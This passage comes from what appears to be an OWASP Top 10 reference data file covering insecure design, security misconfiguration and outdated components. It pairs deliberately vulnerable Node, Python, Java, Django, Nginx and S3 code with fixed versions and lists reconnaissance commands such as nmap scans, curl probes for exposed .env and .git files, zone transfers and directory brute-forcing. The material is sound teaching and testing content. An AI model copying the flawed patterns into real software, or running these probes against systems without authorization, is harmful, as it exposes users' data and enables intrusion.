  if (user && await bcrypt.compare(password, user.passwordHash)) {
    const token = jwt.sign({ id: user.id }, JWT_SECRET);
    return res.json({ token });
  }
  res.status(401).json({ error: 'Invalid credentials' });
});`,
        fixed: `
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');

// IP-based rate limiting
const loginLimiter = rateLimit({
  store: new RedisStore({ client: redisClient }),
  windowMs: 15 * 60 * 1000,  // 15-minute window
  max: 5,                      // 5 attempts per window
  message: { error: 'Too many login attempts. Please try again later.' },
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => req.ip,
});

// Account-based lockout
const MAX_FAILED_ATTEMPTS = 5;
const LOCKOUT_DURATION = 30 * 60 * 1000; // 30 minutes

app.post('/api/login', loginLimiter, async (req, res) => {
  const { username, password } = req.body;
  const user = await User.findOne({ username });

  if (!user) {
    // Constant-time response to prevent user enumeration
    await bcrypt.hash('dummy-password', 12);
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Check account lockout
  if (user.lockoutUntil && user.lockoutUntil > Date.now()) {
    const remaining = Math.ceil((user.lockoutUntil - Date.now()) / 60000);
    return res.status(423).json({
      error: 'Account locked. Try again in ' + remaining + ' minutes.',
    });
  }

  if (await bcrypt.compare(password, user.passwordHash)) {
    // Reset failed attempts on successful login
    await User.updateOne({ _id: user._id }, {
      failedAttempts: 0,
      lockoutUntil: null,
    });
    const token = jwt.sign({ id: user.id }, JWT_SECRET, { expiresIn: '15m' });
    return res.json({ token });
  }

  // Increment failed attempts
  const attempts = (user.failedAttempts || 0) + 1;
  const update = { failedAttempts: attempts };
  if (attempts >= MAX_FAILED_ATTEMPTS) {
    update.lockoutUntil = Date.now() + LOCKOUT_DURATION;
  }
  await User.updateOne({ _id: user._id }, update);
  res.status(401).json({ error: 'Invalid credentials' });
});`,
      },
      {
        title: 'Vulnerable: Business Logic Flaw in Order Processing (Python)',
        language: 'python',
        vulnerable: `
@app.route('/api/orders', methods=['POST'])
def create_order():
    items = request.json['items']
    discount_code = request.json.get('discount_code')

    total = sum(item['price'] * item['quantity'] for item in items)

    # No validation on quantities or prices
    if discount_code:
        discount = get_discount(discount_code)
        total -= discount  # Can apply multiple times; no minimum check

    # Total can go negative
    charge_payment(current_user, total)
    create_order_record(current_user, items, total)
    return jsonify({'total': total})`,
        fixed: `
@app.route('/api/orders', methods=['POST'])
@login_required
def create_order():
    items = request.json.get('items', [])
    discount_code = request.json.get('discount_code')

    if not items or len(items) > 100:
        return jsonify({'error': 'Invalid order'}), 400

    # Validate each item against server-side catalog
    validated_items = []
    for item in items:
        product = Product.query.get(item.get('product_id'))
        if not product or not product.is_available:
            return jsonify({'error': 'Product not available'}), 400

        quantity = int(item.get('quantity', 0))
        if quantity < 1 or quantity > product.max_order_quantity:
            return jsonify({'error': 'Invalid quantity'}), 400

        if quantity > product.stock:
            return jsonify({'error': 'Insufficient stock'}), 400

        # Use server-side price, not client-provided
        validated_items.append({
            'product': product,
            'quantity': quantity,
            'price': product.price,
        })

    total = sum(i['price'] * i['quantity'] for i in validated_items)

    # Apply discount with validation
    if discount_code:
        discount = validate_and_consume_discount(discount_code, current_user)
        if discount:
            total = max(total - discount.amount, 0)  # Never negative
        else:
            return jsonify({'error': 'Invalid or expired discount'}), 400

    if total <= 0:
        return jsonify({'error': 'Invalid order total'}), 400

    # Atomic transaction
    try:
        with db.session.begin():
            order = create_order_record(current_user, validated_items, total)
            charge_result = charge_payment(current_user, total)
            if not charge_result.success:
                raise PaymentError(charge_result.message)
            update_stock(validated_items)
        return jsonify({'order_id': order.id, 'total': total})
    except PaymentError as e:
        return jsonify({'error': str(e)}), 402`,
      },
      {
        title: 'Vulnerable: Insecure Password Reset Design (Java)',
        language: 'java',
        vulnerable: `
@PostMapping("/api/forgot-password")
public ResponseEntity<?> forgotPassword(@RequestParam String email) {
    User user = userRepository.findByEmail(email);
    if (user == null) {
        return ResponseEntity.badRequest().body("User not found"); // User enumeration
    }

    // Predictable token based on timestamp
    String token = String.valueOf(System.currentTimeMillis());
    user.setResetToken(token);
    // No expiration set
    userRepository.save(user);

    emailService.send(email,
        "Reset your password: https://example.com/reset?token=" + token);
    return ResponseEntity.ok("Reset email sent");
}

@PostMapping("/api/reset-password")
public ResponseEntity<?> resetPassword(
        @RequestParam String token,
        @RequestParam String newPassword) {
    User user = userRepository.findByResetToken(token);
    if (user == null) {
        return ResponseEntity.badRequest().body("Invalid token");
    }
    // Token never expires and is not invalidated after use
    user.setPassword(newPassword); // No hashing
    userRepository.save(user);
    return ResponseEntity.ok("Password reset successful");
}`,
        fixed: `
@PostMapping("/api/forgot-password")
public ResponseEntity<?> forgotPassword(@RequestParam String email) {
    // Always return same response to prevent user enumeration
    User user = userRepository.findByEmail(email);
    if (user != null) {
        // Rate limit: max 3 reset requests per hour per email
        if (resetRateLimiter.isAllowed(email)) {
            // Cryptographically secure random token
            String token = UUID.randomUUID().toString();
            String hashedToken = BCrypt.hashpw(token, BCrypt.gensalt(12));

            user.setResetTokenHash(hashedToken);
            user.setResetTokenExpiry(
                LocalDateTime.now().plusMinutes(30)); // 30-min expiry
            user.setResetAttempts(0);
            userRepository.save(user);

            // Send unhashed token in email
            emailService.send(email,
                "Reset your password: https://example.com/reset?token=" + token);
        }
    }
    return ResponseEntity.ok(
        "If the email exists, a reset link has been sent.");
}

@PostMapping("/api/reset-password")
public ResponseEntity<?> resetPassword(
        @RequestParam String token,
        @RequestParam String newPassword) {
    // Validate password strength
    if (!passwordValidator.isStrong(newPassword)) {
        return ResponseEntity.badRequest()
            .body("Password does not meet requirements");
    }

    // Find users with non-expired tokens (hash comparison needed)
    List<User> candidates = userRepository.findByResetTokenExpiryAfter(
        LocalDateTime.now());

    User matchedUser = null;
    for (User u : candidates) {
        if (BCrypt.checkpw(token, u.getResetTokenHash())) {
            matchedUser = u;
            break;
        }
    }

    if (matchedUser == null) {
        return ResponseEntity.badRequest().body("Invalid or expired token");
    }

    // Hash and update password, invalidate token
    matchedUser.setPasswordHash(
        BCrypt.hashpw(newPassword, BCrypt.gensalt(12)));
    matchedUser.setResetTokenHash(null);
    matchedUser.setResetTokenExpiry(null);

    // Invalidate all existing sessions
    sessionRepository.deleteAllByUserId(matchedUser.getId());

    userRepository.save(matchedUser);
    auditLog.record("password_reset", matchedUser.getId());
    return ResponseEntity.ok("Password reset successful. Please log in.");
}`,
      },
    ],

    references: [
      'https://owasp.org/Top10/A04_2021-Insecure_Design/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Abuse_Case_Cheat_Sheet.html',
      'https://owasp.org/www-project-threat-model/',
      'https://www.microsoft.com/en-us/securityengineering/sdl/',
      'NIST SP 800-160: Systems Security Engineering',
      'Case Study: Uber surge pricing abuse (2016) -- attackers manipulated business logic for free rides',
      'Case Study: Starbucks gift card race condition -- infinite money via concurrent balance transfers',
    ],
  },

  // =========================================================================
  // A05:2021 - Security Misconfiguration
  // =========================================================================
  {
    id: 'A05',
    name: 'Security Misconfiguration',
    description:
      'The application might be vulnerable if it is missing appropriate security hardening ' +
      'across any part of the application stack, or if it has improperly configured permissions ' +
      'on cloud services. This includes unnecessary features enabled or installed, default ' +
      'accounts and passwords unchanged, overly informative error handling, disabled or ' +
      'improperly configured security features, and outdated or vulnerable server software. ' +
      'With the move to highly configurable software and cloud services, this category has ' +
      'become increasingly important. Notable CWEs include CWE-16 (Configuration) and ' +
      'CWE-611 (Improper Restriction of XML External Entity Reference).',

    impact:
      'Security misconfiguration can provide attackers with unauthorized access to system data ' +
      'or functionality. Occasionally, such flaws result in a complete system compromise. ' +
      'Misconfigured cloud storage has led to some of the largest data exposures, with S3 ' +
      'bucket misconfigurations alone responsible for billions of exposed records. Default ' +
      'credentials on administrative interfaces can give attackers full control.',

    examples: [
      'Default credentials not changed on databases, admin panels, or infrastructure',
      'Unnecessary ports and services open on production servers',
      'Directory listing enabled on web servers',
      'Detailed error messages or stack traces exposed to users',
      'Cloud storage (S3, GCS, Azure Blob) publicly accessible',
      'Unnecessary HTTP methods enabled (TRACE, DELETE, PUT on web server)',
      'Missing or misconfigured security headers (CSP, X-Frame-Options, HSTS)',
      'Debug mode enabled in production (Django DEBUG=True, Express detailed errors)',
      'Default sample applications not removed from production servers',
      'Misconfigured CORS allowing access from any origin',
      'TLS/SSL misconfiguration: weak ciphers, expired certificates',
      'Unnecessary features installed (phpMyAdmin, Adminer, debug endpoints)',
      'Missing rate limiting on API endpoints',
      'Overly permissive IAM roles/policies in cloud environments',
      'Kubernetes RBAC misconfigurations: overly permissive service accounts',
      'Docker containers running as root',
      'Missing network segmentation between environments',
      'Firewall rules too permissive (0.0.0.0/0 access)',
      'Missing or weak Content-Security-Policy headers',
      'Server software version disclosure in headers or error pages',
      'Backup files accessible via web (.bak, .old, .sql, .tar.gz)',
      'Git repositories exposed (.git directory accessible)',
      'Environment files exposed (.env, .config, application.properties)',
      'Admin interfaces without IP restrictions or VPN requirements',
      'Missing Referrer-Policy, Permissions-Policy headers',
      'SMTP open relay configuration',
      'DNS zone transfer enabled for unauthorized clients',
      'Missing Subresource Integrity (SRI) for CDN-hosted scripts',
      'Misconfigured reverse proxy passing internal headers',
      'Exposed Kubernetes dashboard without authentication',
    ],

    testingGuide: [
      '1. Scan for open ports: nmap -sV -sC -p- target.com',
      '2. Check for default credentials on all services (admin/admin, root/root, etc.)',
      '3. Test for directory listing: browse to /images/, /uploads/, /css/, /js/',
      '4. Check for exposed .git directory: curl https://target.com/.git/HEAD',
      '5. Check for exposed .env file: curl https://target.com/.env',
      '6. Test for server version disclosure: curl -sI https://target.com | grep Server',
      '7. Check security headers: curl -sI https://target.com | grep -iE "x-frame|csp|strict|x-content"',
      '8. Test for unnecessary HTTP methods: curl -X OPTIONS https://target.com',
      '9. Check for TRACE method: curl -X TRACE https://target.com',
      '10. Test for detailed error messages: send malformed input and check response',
      '11. Scan for backup files: check for .bak, .old, .swp, .sql, ~, .tar.gz extensions',
      '12. Test for admin panels: /admin, /wp-admin, /administrator, /console, /phpmyadmin',
      '13. Check cloud storage permissions: aws s3 ls s3://bucket-name --no-sign-request',
      '14. Review CSP header for unsafe-inline, unsafe-eval, wildcard sources',
      '15. Check for missing SRI on third-party scripts',
      '16. Test for SSRF via misconfigured proxies',
      '17. Check DNS for zone transfer: dig axfr @ns1.target.com target.com',
      '18. Test for open SMTP relay: telnet target.com 25',
      '19. Review Docker images: docker inspect, check for root user',
      '20. Check Kubernetes configuration: kubectl auth can-i --list',
      '21. Review IAM policies: aws iam get-policy-version',
      '22. Scan for misconfigured CORS: test with Origin header from evil domain',
      '23. Check for exposed API documentation (Swagger/OpenAPI at /api-docs, /swagger)',
      '24. Test for HTTP request smuggling via misconfigured proxies',
      '25. Verify TLS configuration: testssl.sh target.com',
      '26. Check for exposed health/metrics endpoints: /health, /metrics, /actuator',
      '27. Test for missing cookie security flags (Secure, HttpOnly, SameSite)',
      '28. Verify that development endpoints are not in production (/debug, /test)',
      '29. Check for exposed source maps (.map files)',
      '30. Review network ACLs and security groups in cloud environments',
    ],

    tools: [
      'Nmap: nmap -sV -sC -A -p- target.com (comprehensive port/service scan)',
      'Nikto: nikto -h https://target.com (web server misconfiguration scanner)',
      'testssl.sh: ./testssl.sh https://target.com (TLS configuration audit)',
      'Mozilla Observatory: https://observatory.mozilla.org (security header analysis)',
      'SecurityHeaders.com: https://securityheaders.com/?q=target.com',
      'Nuclei: nuclei -u https://target.com -t misconfiguration/ -t exposures/',
      'ScoutSuite: scout aws --profile myprofile (cloud security auditing)',
      'Prowler: prowler -M csv (AWS security assessment tool)',
      'kube-bench: kube-bench run (CIS Kubernetes benchmark)',
      'kube-hunter: kube-hunter --remote target.com (Kubernetes penetration testing)',
      'Trivy: trivy config . (IaC misconfiguration scanning)',
      'Checkov: checkov -d /path/to/terraform (IaC security scanning)',
      'tfsec: tfsec /path/to/terraform (Terraform security scanner)',
      'hadolint: hadolint Dockerfile (Dockerfile best practices)',
      'git-secrets: git secrets --scan (scan for secrets in code)',
      'CloudSploit: open-source cloud security scanner',
      'lynis: lynis audit system (Linux system hardening audit)',
      'wapiti: wapiti -u https://target.com (web vulnerability scanner)',
      'gobuster: gobuster dir -u https://target.com -w common.txt (directory brute force)',
      'whatweb: whatweb https://target.com (web technology identification)',
    ],

    remediation: [
      'Implement a repeatable hardening process for all environments',
      'Remove or do not install unnecessary features, frameworks, and components',
      'Review and update configurations as part of the patch management process',
      'Implement a segmented application architecture with proper separation',
      'Send security directives to clients via headers (CSP, HSTS, X-Frame-Options)',
      'Automate configuration verification using CIS benchmarks',
      'Use Infrastructure as Code (IaC) with security scanning in CI/CD',
      'Implement proper error handling that does not expose stack traces or sensitive info',
      'Remove default accounts or change their passwords before deployment',
      'Implement least-privilege IAM policies for cloud resources',
      'Enable logging and monitoring on all security-relevant configurations',
      'Use configuration management tools (Ansible, Chef, Puppet) for consistent baselines',
      'Implement proper network segmentation between environments',
      'Use container security best practices: non-root users, read-only filesystem, minimal images',
      'Regularly audit cloud permissions and resource exposure',
    ],

    codeExamples: [
      {
        title: 'Vulnerable: Express.js Security Misconfiguration',
        language: 'javascript',
        vulnerable: `
const express = require('express');
const app = express();

// Debug mode with detailed errors in production
app.set('env', 'development');

// No security headers
// No CORS restrictions
app.use(cors());

// Exposes server technology
// Default error handler shows stack traces

app.use((err, req, res, next) => {
  // Sends full stack trace to client
  res.status(500).json({
    error: err.message,
    stack: err.stack,
    query: req.query,
  });
});

// Directory listing enabled
app.use(express.static('public', { dotfiles: 'allow' }));

app.listen(3000);`,
        fixed: `
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');

const app = express();

// Production mode
app.set('env', 'production');
app.disable('x-powered-by');

// Security headers via helmet
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      frameSrc: ["'none'"],
    },
  },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));

// Restrictive CORS
app.use(cors({
  origin: ['https://app.example.com'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
}));

// Rate limiting
app.use(rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
}));

// Static files: deny dotfiles, disable directory listing
app.use(express.static('public', {
  dotfiles: 'deny',
  index: false,
  etag: true,
}));

// Production error handler: no stack traces
app.use((err, req, res, next) => {
  logger.error('Unhandled error', {
    error: err.message,
    stack: err.stack,
    path: req.path,
    method: req.method,
    ip: req.ip,
  });
  res.status(500).json({ error: 'An internal error occurred' });
});

app.listen(3000);`,
      },
      {
        title: 'Vulnerable: Django Security Misconfiguration',
        language: 'python',
        vulnerable: `
# settings.py -- insecure configuration
DEBUG = True
ALLOWED_HOSTS = ['*']
SECRET_KEY = 'my-secret-key-hardcoded'

# No CSRF middleware
MIDDLEWARE = [
    'django.middleware.common.CommonMiddleware',
    # Missing: SecurityMiddleware, CsrfViewMiddleware
]

# No security headers
SECURE_BROWSER_XSS_FILTER = False
SECURE_CONTENT_TYPE_NOSNIFF = False
SECURE_SSL_REDIRECT = False
SESSION_COOKIE_SECURE = False
CSRF_COOKIE_SECURE = False
X_FRAME_OPTIONS = 'ALLOWALL'

# Exposed admin at default URL
# url(r'^admin/', admin.site.urls),`,
        fixed: `
# settings.py -- hardened configuration
import os

DEBUG = False
ALLOWED_HOSTS = ['app.example.com', 'www.example.com']
SECRET_KEY = os.environ['DJANGO_SECRET_KEY']

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
    'csp.middleware.CSPMiddleware',
]

# Security headers
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
SECURE_SSL_REDIRECT = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Strict'
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_HTTPONLY = True
X_FRAME_OPTIONS = 'DENY'
SECURE_REFERRER_POLICY = 'strict-origin-when-cross-origin'

# Content Security Policy
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'",)
CSP_STYLE_SRC = ("'self'",)

# Non-default admin URL
# url(r'^secure-mgmt-4f9a2b/', admin.site.urls),`,
      },
      {
        title: 'Vulnerable: Nginx Security Misconfiguration',
        language: 'javascript',
        vulnerable: `
// nginx.conf -- insecure (shown as string for reference)
const insecureNginx = \`
server {
    listen 80;
    server_name example.com;

    # No HTTPS redirect
    # Server version exposed
    server_tokens on;

    # Directory listing enabled
    autoindex on;

    # No security headers

    location / {
        proxy_pass http://backend:3000;
    }

    # Exposed status page
    location /nginx_status {
        stub_status on;
    }

    # Exposed .git directory
    # No restriction on dotfiles
}
\`;`,
        fixed: `
// nginx.conf -- hardened (shown as string for reference)
const secureNginx = \`
# Redirect HTTP to HTTPS
server {
    listen 80;
    server_name example.com;
    return 301 https://\$server_name\$request_uri;
}

server {
    listen 443 ssl http2;
    server_name example.com;

    # Hide server version
    server_tokens off;

    # TLS configuration
    ssl_certificate /etc/ssl/certs/example.com.crt;
    ssl_certificate_key /etc/ssl/private/example.com.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:10m;
    ssl_stapling on;
    ssl_stapling_verify on;

    # Security headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "0" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;

    # Disable directory listing
    autoindex off;

    # Block access to hidden files
    location ~ /\\. {
        deny all;
        return 404;
    }

    # Block access to backup and config files
    location ~* \\.(bak|config|sql|fla|psd|ini|log|sh|inc|swp|dist|env)$ {
        deny all;
        return 404;
    }

    location / {
        proxy_pass http://backend:3000;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        proxy_hide_header X-Powered-By;
    }

    # Status page restricted to internal network
    location /nginx_status {
        stub_status on;
        allow 10.0.0.0/8;
        deny all;
    }
}
\`;`,
      },
      {
        title: 'Vulnerable: AWS S3 Misconfiguration (Python boto3)',
        language: 'python',
        vulnerable: `
import boto3

s3 = boto3.client('s3')

# Creating a publicly accessible bucket
s3.create_bucket(Bucket='my-app-data')
s3.put_bucket_acl(Bucket='my-app-data', ACL='public-read')

# Uploading sensitive data to a public bucket
s3.upload_file(
    '/tmp/user-data.csv',
    'my-app-data',
    'exports/user-data.csv',
    ExtraArgs={'ACL': 'public-read'}
)`,
        fixed: `
import boto3
import json

s3 = boto3.client('s3')

# Create bucket with encryption and blocked public access
s3.create_bucket(
    Bucket='my-app-data',
    CreateBucketConfiguration={'LocationConstraint': 'us-east-1'}
)

# Block all public access
s3.put_public_access_block(
    Bucket='my-app-data',
    PublicAccessBlockConfiguration={
        'BlockPublicAcls': True,
        'IgnorePublicAcls': True,
        'BlockPublicPolicy': True,
        'RestrictPublicBuckets': True,
    }
)

# Enable server-side encryption
s3.put_bucket_encryption(
    Bucket='my-app-data',
    ServerSideEncryptionConfiguration={
        'Rules': [{
            'ApplyServerSideEncryptionByDefault': {
                'SSEAlgorithm': 'aws:kms',
                'KMSMasterKeyID': 'alias/my-key',
            },
            'BucketKeyEnabled': True,
        }]
    }
)

# Enable versioning for data protection
s3.put_bucket_versioning(
    Bucket='my-app-data',
    VersioningConfiguration={'Status': 'Enabled'}
)

# Enable access logging
s3.put_bucket_logging(
    Bucket='my-app-data',
    BucketLoggingStatus={
        'LoggingEnabled': {
            'TargetBucket': 'my-app-logs',
            'TargetPrefix': 's3-access-logs/',
        }
    }
)

# Upload with server-side encryption
s3.upload_file(
    '/tmp/user-data.csv',
    'my-app-data',
    'exports/user-data.csv',
    ExtraArgs={
        'ServerSideEncryption': 'aws:kms',
        'KMSKeyId': 'alias/my-key',
    }
)`,
      },
    ],

    references: [
      'https://owasp.org/Top10/A05_2021-Security_Misconfiguration/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html',
      'https://www.cisecurity.org/cis-benchmarks/',
      'https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-standards.html',
      'Case Study: Capital One S3 misconfiguration (2019) -- 106 million customer records exposed',
      'Case Study: Twitch .git exposure (2021) -- entire source code and internal data leaked',
      'Case Study: Microsoft Power Apps portal misconfiguration (2021) -- 38 million records exposed',
    ],
  },

  // =========================================================================
  // A06:2021 - Vulnerable and Outdated Components
  // =========================================================================
  {
    id: 'A06',
    name: 'Vulnerable and Outdated Components',
    description:
      'You are likely vulnerable if you do not know the versions of all components you use ' +
      '(both client-side and server-side), if the software is vulnerable/unsupported/out of ' +
      'date, if you do not scan for vulnerabilities regularly, if you do not fix or upgrade ' +
      'the underlying platform and frameworks in a timely fashion, or if software developers ' +
      'do not test the compatibility of updated, upgraded, or patched libraries. This category ' +
      'was previously titled "Using Components with Known Vulnerabilities" and remains a ' +
      'persistent challenge due to the complexity of modern software supply chains.',

    impact:
      'Vulnerable components can be exploited to achieve remote code execution, data theft, ' +
      'denial of service, or complete system takeover. The impact depends on the specific ' +
      'vulnerability -- some component vulnerabilities (like Log4Shell) have led to widespread ' +
      'compromise across millions of systems. Supply chain attacks through compromised ' +
      'components can affect thousands of downstream users.',

    examples: [
      'Running web server software with known CVEs (Apache, Nginx, IIS with unpatched vulnerabilities)',
      'Using outdated JavaScript libraries with known XSS vulnerabilities (jQuery < 3.5.0)',
      'Using outdated framework versions (Spring < 5.3.18 vulnerable to Spring4Shell)',
      'Dependencies with known critical CVEs not updated (Log4j < 2.17.1)',
      'Using end-of-life (EOL) runtime versions (Python 2.x, Node.js 14.x, Java 8 without LTS)',
      'Unpatched operating systems and container base images',
      'Using npm packages that have been deprecated or marked as malicious',
      'Transitive (indirect) dependencies with known vulnerabilities',
      'Using Docker images with known vulnerabilities in the base layer',
      'Not monitoring security advisories for dependencies',
      'Using components without verifying their integrity (no checksum verification)',
      'Pulling dependencies from untrusted or unofficial sources',
      'Not pinning dependency versions (using floating versions like ^1.0.0)',
      'Using components with no active security maintenance',
      'Failing to update WAF/IDS/IPS signature databases',
    ],

    testingGuide: [
      '1. Generate a complete Software Bill of Materials (SBOM) for the application',
      '2. Check all direct dependencies for known vulnerabilities',
      '3. Check all transitive dependencies for known vulnerabilities',
      '4. Verify that all components are currently maintained and supported',
      '5. Check for end-of-life frameworks and runtime versions',
      '6. Verify dependency integrity (checksums, signatures)',
      '7. Review lockfiles for unexpected changes (package-lock.json, yarn.lock, Pipfile.lock)',
      '8. Check for typosquatting attacks in dependency names',
      '9. Review dependency licenses for compliance requirements',
      '10. Test that updating dependencies does not break functionality',
      '11. Verify that internal/private package registries are properly secured',
      '12. Check for deprecated APIs used from dependencies',
      '13. Review Docker base images for vulnerabilities',
      '14. Check JavaScript bundles for vulnerable client-side libraries',
      '15. Verify that no test/development dependencies are included in production builds',
      '16. Check for known malicious packages in dependency tree',
      '17. Review dependency download statistics and maintainer reputation',
      '18. Test for dependency confusion attacks (private package name collisions)',
      '19. Verify that security patches are applied within defined SLA windows',
      '20. Check for components that have been forked from abandoned projects',
    ],

    tools: [
      'npm audit: npm audit --production (Node.js dependency audit)',
      'yarn audit: yarn audit --level moderate',
      'pip-audit: pip-audit -r requirements.txt (Python dependency audit)',
      'safety: safety check -r requirements.txt (Python vulnerability check)',
      'bundler-audit: bundle-audit check --update (Ruby dependency audit)',
      'OWASP Dependency-Check: dependency-check --scan /path/to/project --format HTML',
      'Snyk: snyk test --all-projects (multi-language dependency scanning)',
      'Trivy: trivy fs --security-checks vuln /path/to/project',
      'Grype: grype dir:/path/to/project (vulnerability scanner for containers and filesystems)',
      'Syft: syft /path/to/project -o cyclonedx-json (SBOM generation)',
      'Retire.js: retire --js --path /path/to/project (JavaScript library scanning)',
      'Dependabot: GitHub-native automated dependency updates',
      'Renovate: automated dependency update PRs',
      'OSV-Scanner: osv-scanner -r /path/to/project (Google OSV database)',
      'Mend (WhiteSource): commercial SCA tool',
      'Sonatype Nexus IQ: commercial component analysis',
      'Black Duck: commercial SCA and license compliance',
      'JFrog Xray: commercial artifact analysis and scanning',
      'Socket.dev: socket npm info <package> (supply chain risk analysis)',
      'Trivy image scanning: trivy image myapp:latest (Docker image scanning)',
    ],

    remediation: [
      'Remove unused dependencies, unnecessary features, components, files, and documentation',
      'Continuously inventory versions of all components and their dependencies (SBOM)',
      'Monitor CVE and NVD databases, and security mailing lists for vulnerability announcements',
      'Only obtain components from official sources over secure links',
      'Verify component integrity using signatures and checksums',
      'Prefer components with active maintenance and security track records',
      'Monitor for unmaintained libraries and components; plan for replacements',
      'Pin dependency versions and use lockfiles to ensure reproducible builds',
      'Apply security patches within defined SLA windows (critical: 24-48 hours)',
      'Implement automated dependency scanning in CI/CD pipelines',
      'Use Dependabot, Renovate, or similar tools for automated update PRs',
      'Implement a private package registry to control approved components',
      'Conduct regular dependency audits (at least monthly)',
      'Use container base images with minimal attack surface (distroless, Alpine)',
      'Implement a process for evaluating and approving new dependencies',
    ],

    codeExamples: [
      {
        title: 'Vulnerable: Unaudited package.json Dependencies',
        language: 'javascript',
        vulnerable: `
// package.json with vulnerable and unpinned dependencies
{
  "dependencies": {
    "lodash": "*",              // Wildcard: any version
    "express": "^3.0.0",        // Major version 3 is EOL
    "minimist": "~0.0.1",       // Known prototype pollution
    "jquery": "1.8.3",          // Known XSS vulnerabilities
    "moment": "2.29.1",         // Deprecated library
    "request": "2.88.2",        // Deprecated, no longer maintained
    "node-uuid": "1.4.8",       // Deprecated, replaced by uuid
    "serialize-javascript": "1.0.0" // Known RCE vulnerability
  }
}`,
        fixed: `
// package.json with audited and pinned dependencies
{
  "dependencies": {
    "lodash": "4.17.21",        // Pinned to specific patched version
    "express": "4.19.2",        // Current stable version
    "yargs-parser": "21.1.1",   // Replaced minimist
    "date-fns": "3.6.0",        // Replaced moment (active, tree-shakeable)
    "undici": "6.19.2",         // Replaced request (Node.js native)
    "uuid": "9.0.1",            // Current, maintained
    "serialize-javascript": "6.0.2" // Patched version
  },
  "scripts": {
    "audit": "npm audit --production",
    "audit:fix": "npm audit fix",
    "deps:check": "npx npm-check-updates",
    "preinstall": "npx npm-package-arg-check"
  },
  "overrides": {
    // Force transitive dependency versions if needed
  }
}`,
      },
      {
        title: 'Vulnerable: Python Requirements with Known Vulnerabilities',
        language: 'python',
        vulnerable: `
# requirements.txt with vulnerable packages
Django==2.2.0          # EOL, known vulnerabilities
Flask==0.12.0          # Outdated, security issues
requests==2.20.0       # Known vulnerability
Pillow==6.0.0          # Multiple known CVEs
PyYAML==3.13           # Arbitrary code execution
cryptography==2.1.0    # Outdated, weak algorithms
urllib3==1.24.0         # Known vulnerabilities
Jinja2==2.10.0         # XSS vulnerabilities
SQLAlchemy==1.2.0      # Known issues
paramiko==2.4.0        # Known vulnerabilities`,
        fixed: `
# requirements.txt with pinned, patched versions
Django==5.0.7           # Current LTS
Flask==3.0.3            # Current stable
requests==2.32.3        # Current stable
Pillow==10.4.0          # Current stable
PyYAML==6.0.1           # Current stable
cryptography==42.0.8    # Current stable
urllib3==2.2.2           # Current stable
Jinja2==3.1.4           # Current stable
SQLAlchemy==2.0.31      # Current stable
paramiko==3.4.0         # Current stable

# In pyproject.toml, also configure:
# [tool.pip-audit]
# desc = "on"
# [tool.safety]
# full-report = true`,
      },
      {
        title: 'CI/CD Pipeline with Dependency Scanning (GitHub Actions)',
        language: 'javascript',
        vulnerable: `
// .github/workflows/ci.yml -- no dependency scanning
// name: CI
// on: [push]
// jobs:
//   build:
//     runs-on: ubuntu-latest
//     steps:
//       - uses: actions/checkout@v2
//       - run: npm install
//       - run: npm test`,
        fixed: `
// .github/workflows/ci.yml -- with dependency scanning
// name: CI with Security
// on: [push, pull_request]
// jobs:
//   security-audit:
//     runs-on: ubuntu-latest
//     steps:
//       - uses: actions/checkout@v4
//
//       - name: Setup Node.js
//         uses: actions/setup-node@v4
//         with:
//           node-version: '20'
//           cache: 'npm'
//
//       - name: Install dependencies
//         run: npm ci  # Uses lockfile for reproducible builds
//
//       - name: Run npm audit
//         run: npm audit --production --audit-level=moderate
//
//       - name: Run Snyk security scan
//         uses: snyk/actions/node@master
//         env:
//           SNYK_TOKEN: secrets.SNYK_TOKEN
//
//       - name: Run Trivy vulnerability scanner
//         uses: aquasecurity/trivy-action@master
//         with:
//           scan-type: fs
//           scan-ref: .
